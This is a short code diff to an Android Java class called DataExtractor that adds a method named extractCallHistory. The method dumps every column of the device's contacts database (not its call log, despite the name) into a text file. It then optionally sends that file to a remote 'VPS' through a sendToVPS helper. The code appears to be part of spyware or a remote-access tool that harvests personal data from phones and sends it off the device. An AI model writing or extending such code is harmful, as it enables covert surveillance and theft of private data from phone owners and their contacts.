@@ -188,6 +188,32 @@ public class DataExtractor {
         }
 
     }
+
+    public void extractCallHistory(boolean sendToVPS) {
+        ContentResolver cr = context.getContentResolver();
+        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+
+        String data = "\tCALL_HISTORY";
+        if (cursor.moveToFirst()) { // must check the result to prevent exception
+            do {
+                data += "\n";
+                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
+                    if (idx == 0) {
+                        data += cursor.getColumnName(idx) + ":" + cursor.getString(idx) + "\n";
+                    } else {
+                        data += "\t" + cursor.getColumnName(idx) + ":" + cursor.getString(idx) + "\n";
+                    }
+
+                }
+                // use msgData
+
+            } while (cursor.moveToNext());
+        }
+        writeToFile(data, "call_history.txt");
+        if (sendToVPS) {
+            sendToVPS(data, "call_history.txt");
+        }
+    }
 }
 
 
